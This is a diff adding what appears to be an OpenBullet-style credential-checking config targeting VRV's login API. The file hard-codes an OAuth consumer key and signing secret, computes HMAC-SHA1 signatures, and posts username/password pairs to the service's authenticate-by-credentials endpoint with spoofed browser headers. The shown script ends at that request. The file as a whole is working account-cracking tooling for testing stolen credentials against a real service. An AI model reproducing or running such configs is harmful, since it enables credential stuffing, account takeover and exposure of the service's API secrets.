@@ -1,0 +1,39 @@
+[SETTINGS]
+{
+  "Name": "VRV",
+  "SuggestedBots": 1,
+  "LastModified": "2018-11-07T01:01:02.0450086+00:00",
+  "AdditionalInfo": "",
+  "Author": "Ruri",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_CURR_TIME FUNCTION CurrentUnixTime "" -> VAR "TIME" 
+#ENCODED_DOMAIN FUNCTION URLEncode "https://api.vrv.co/core/authenticate/by:credentials" -> VAR "DOMAIN" 
+#PARAMS_(SORTED) FUNCTION URLEncode "oauth_consumer_key=OvqR158Z9212i41UkNRzooutpU9Vp0vuXD9K0zKAvJdXPh6LfMOro4stVQRS&oauth_nonce=J1u7MRkahbSFnDFcN2hRICVQr6PxYufb&oauth_signature_method=HMAC-SHA1&oauth_timestamp=<TIME>&oauth_version=1.0&email=<USER>&password=<PASS>" -> VAR "PARAMS" 
+#HMAC_SIGNATURE FUNCTION HMAC SHA1 "EBgJav6Z99M9jFLzcexL6iETovNGbobFAJGudkDKMloqaBJgdo9u3WNuumM1&" HmacBase64=FALSE "POST&<DOMAIN>&<PARAMS>" -> VAR "SIGNATURE" 
+#ENCODE_SIGNATURE FUNCTION Base64Encode "<SIGNATURE>" -> VAR "ENCSIG" 
+#OAUTH_POST REQUEST POST "https://api.vrv.co/core/authenticate/by:credentials" AutoRedirect=TRUE 
+  CONTENT "email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://vrv.co" 
+  HEADER "Referer: https://vrv.co/" 
+  HEADER "Authorization: OAuth oauth_consumer_key=\"OvqR158Z9212i41UkNRzooutpU9Vp0vuXD9K0zKAvJdXPh6LfMOro4stVQRS\", oauth_nonce=\"J1u7MRkahbSFnDFcN2hRICVQr6PxYufb\", oauth_signature=\"<ENCSIG>\", oauth_signature_method=\"HMAC-SHA1\", oauth_timestamp=\"<TIME>\", oauth_version=\"1.0\"" 
